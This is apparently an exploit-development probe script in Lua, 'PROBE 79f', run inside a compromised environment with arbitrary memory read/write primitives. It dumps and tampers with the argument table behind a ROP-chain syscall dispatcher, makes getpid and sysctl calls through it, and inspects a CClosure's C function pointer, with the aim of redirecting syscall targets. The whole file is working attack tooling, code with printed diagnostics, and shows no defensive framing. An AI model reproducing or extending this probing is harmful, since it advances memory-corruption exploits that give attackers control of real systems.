-- CRASH_CLASS: MODERATE
-- PROBE 79f: Argument table direct control — test if __call reads from the chain's argument slots
--
-- Context: 45c proved that corrupting fn_addr and ROP chain entries 0-7 does NOT
-- affect syscall results. The __call C function has a separate dispatch path.
-- BUT the ROP chain reads function pointers from heap slots at fixed offsets
-- (fc040, fc050, fc060, ..., fc0b0 relative to the pipe object).
--
-- Hypothesis: The __call C function reads from the SAME argument table slots
-- that the chain uses. If we write controlled values there, we might redirect
-- the actual syscall target without needing the chain.
--
-- This probe:
--   A) Dumps the argument table contents before/after a getpid call
--   B) Identifies which slots change when we change syscall_no
--   C) Tests writing to the fn_addr source slot (the one at fc040 offset)
--   D) Tests writing controlled values to argument slots

print("=== PROBE 79f: ARGUMENT TABLE DISPATCH PROBE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        return string.format("0x%08X_%08X", v.h, v.l)
    end
    return string.format("0x%X", to_num(v))
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function wd(addr, val) return pcall(function() memory.write_dword(addr, val) end) end
local function wq(addr, val) return pcall(function() memory.write_qword(addr, val) end) end
local function rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end

local sc_getpid = make_syscall(20)

local function canary()
    local ok, pid = pcall(function() return sc_getpid():tonumber() end)
    return ok, pid
end

local alive_ok, pid = canary()
print("[0] canary pid=" .. tostring(pid))

-- ==============================
-- SECTION A: Parse the pipe object to find the argument table
-- ==============================
print("")
print("=== SECTION A: LOCATE ARGUMENT TABLE ===")

local pipe_str = tostring(syscall.pipe)
print("[A] pipe string (first 200 chars):")
print("  " .. pipe_str:sub(1, 200))

-- Extract ropchain and fn_addr addresses
local rop_str = pipe_str:match("ropchain @ (0x[0-9a-fA-F]+)")
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
print("[A] ropchain: " .. tostring(rop_str))
print("[A] fn_addr ptr: " .. tostring(fn_str))

if not rop_str then
    print("[!] Cannot parse ropchain address")
    return
end

-- The argument table is at chain_base - 0x20B0 based on observed offsets
-- chain at 0x3110fe0f0, arg table at 0x3110fc040
-- Diff: fe0f0 - fc040 = 0x20B0
-- BUT: let's read it directly from the chain entries
-- Chain entry [02] at +0x010 is the first arg table pointer (fc040)
local rop_base = uint64(rop_str)
local rop_base_num = to_num(rop_base)

-- Read chain entry [02] (+0x010) to get arg_table[0] address
local slot0_ptr = rq(rop_base + 0x010)
print("[A] chain[02] (arg_table slot0 ptr): " .. q(slot0_ptr))

if not slot0_ptr then
    print("[!] Cannot read arg table pointer")
    return
end

-- The argument table slots are at consecutive 0x10-byte spacing:
-- slot0 (fc040): fn_addr source → dereferenced → written to fn_addr
-- slot1 (fc050): rsp pivot target source
-- slot2 (fc060): rdi (arg1) source
-- slot3 (fc070): rsi (arg2) source
-- slot4 (fc080): rdx (arg3) source
-- slot5 (fc090): rcx (arg4) source
-- slot6 (fc0a0): r8 (arg5) source
-- slot7 (fc0b0): syscall_no / r9 source

local slot0 = slot0_ptr  -- fn_addr source
local h0, l0 = get_hi_lo(slot0)
local base = uint64(string.format("0x%X%08X", h0, l0))

print("[A] arg table base (slot0): " .. q(base))
print("")
print("[A] Dumping argument table (8 qword slots):")
for i = 0, 7 do
    local addr = base + (i * 0x10)
    local val = rq(addr)
    local deref = nil
    if val then
        local ok, d = pcall(function() return memory.read_qword(val) end)
        if ok then deref = d end
    end
    print(string.format("  slot[%d] @ +0x%03X: val=%s deref=%s",
        i, i * 0x10, q(val), deref and q(deref) or "unreadable"))
end

-- ==============================
-- SECTION B: Call getpid, then dump again to see what changed
-- ==============================
print("")
print("=== SECTION B: BEFORE/AFTER GETPID ===")

-- Snapshot before
local before = {}
for i = 0, 7 do
    before[i] = rq(base + (i * 0x10))
end

-- Call getpid
local ok_gp, rv_gp = pcall(function() return sc_getpid() end)
print("[B] getpid: ok=" .. tostring(ok_gp) .. " rv=" .. tostring(rv_gp))

-- Snapshot after
print("[B] Changes after getpid:")
local any_change = false
for i = 0, 7 do
    local after = rq(base + (i * 0x10))
    local b_str = before[i] and q(before[i]) or "nil"
    local a_str = after and q(after) or "nil"
    if b_str ~= a_str then
        print(string.format("  slot[%d]: %s -> %s  *** CHANGED ***", i, b_str, a_str))
        any_change = true
    end
end
if not any_change then
    print("  (no changes)")
end

-- ==============================
-- SECTION C: Change syscall_no and see which slots change
-- ==============================
print("")
print("=== SECTION C: SYSCALL_NO CHANGE TRACKING ===")

-- Make a sysctl call (202) and compare arg table
local sc_sysctl = make_syscall(202)

-- Snapshot before sysctl
local before_s = {}
for i = 0, 7 do
    before_s[i] = rq(base + (i * 0x10))
end

-- Prepare sysctl args
local mib = memory.alloc(8)
wd(mib, 1); wd(mib+4, 2) -- CTL_KERN, KERN_OSTYPE
local outbuf = memory.alloc(0x100)
for i=0,0xFC,4 do wd(outbuf+i, 0) end
local oldlenp = memory.alloc(8)
wq(oldlenp, uint64(0x100))

local ok_sc, rv_sc = pcall(function()
    return sc_sysctl(uint64(mib), uint64(2), uint64(outbuf), uint64(oldlenp), uint64(0), uint64(0))
end)
print("[C] sysctl: ok=" .. tostring(ok_sc) .. " rv=" .. tostring(rv_sc))

-- Read output
local out_d0 = rd(outbuf)
local out_d1 = rd(outbuf+4)
local out_d2 = rd(outbuf+8)
if out_d0 then
    local s = ""
    for off = 0, 31 do
        local ok, b = pcall(function() return memory.read_byte(outbuf + off) end)
        if ok and b > 0 and b < 128 then s = s .. string.char(b) end
    end
    print("[C] sysctl output string: " .. s)
end

-- Snapshot after sysctl
print("[C] Changes after sysctl(202):")
any_change = false
for i = 0, 7 do
    local after = rq(base + (i * 0x10))
    local b_str = before_s[i] and q(before_s[i]) or "nil"
    local a_str = after and q(after) or "nil"
    if b_str ~= a_str then
        print(string.format("  slot[%d]: %s -> %s  *** CHANGED ***", i, b_str, a_str))
        any_change = true
    end
end
if not any_change then
    print("  (no changes)")
end

-- ==============================
-- SECTION D: Read fn_addr source and compare across syscall_no values
-- ==============================
print("")
print("=== SECTION D: FN_ADDR SOURCE VALUE PER SYSCALL_NO ===")

-- The fn_addr source slot (slot0) should contain a pointer that gets
-- dereferenced to get the actual function address. If this changes per
-- syscall_no, it's how the dispatcher routes to different functions.

-- Read slot0 indirection: slot0 → *slot0 → fn_addr_value
local slot0_val = rq(base)
print("[D] slot0 raw: " .. q(slot0_val))
if slot0_val then
    local ok, deref0 = pcall(function() return memory.read_qword(slot0_val) end)
    if ok then
        print("[D] *slot0 (fn_addr value for pipe/42): " .. q(deref0))
    end
end

-- Now read fn_addr ptr directly
if fn_str then
    local fn_ptr = uint64(fn_str)
    local fn_val = rq(fn_ptr)
    print("[D] fn_addr at " .. fn_str .. ": " .. q(fn_val))
end

-- ==============================
-- SECTION E: Read the __call CClosure's C function pointer
-- ==============================
print("")
print("=== SECTION E: __CALL CCLOSURE ANALYSIS ===")

-- Get the metatable and find __call
local mt = getmetatable(syscall.pipe)
if mt and mt.__call then
    local call_str = tostring(mt.__call)
    print("[E] __call: " .. call_str)

    -- Try to get CClosure address via debug.getinfo or string parsing
    local addr_hex = call_str:match("(0x[0-9a-fA-F]+)")
    if not addr_hex then
        addr_hex = call_str:match("(%x+)$")
        if addr_hex then addr_hex = "0x" .. addr_hex end
    end

    if addr_hex then
        print("[E] __call CClosure at: " .. addr_hex)
        local cc_addr = uint64(addr_hex)
        -- +0x20 is the C function pointer
        local cfunc = rq(cc_addr + 0x20)
        print("[E] __call +0x20 (C function): " .. q(cfunc))

        -- Dump CClosure structure
        print("[E] CClosure dump:")
        for off = 0, 0x38, 8 do
            local v = rq(cc_addr + off)
            print(string.format("  +0x%02X: %s", off, q(v)))
        end
    end
end

-- Also check: can we find create_initial_chain?
if mt and mt.create_initial_chain then
    local cic_str = tostring(mt.create_initial_chain)
    print("[E] create_initial_chain: " .. cic_str)
end

local cf_ok, cf_pid = canary()
print("")
print("[final] canary ok=" .. tostring(cf_ok) .. " pid=" .. tostring(cf_pid))
print("")
print("=== PROBE 79f COMPLETE ===")
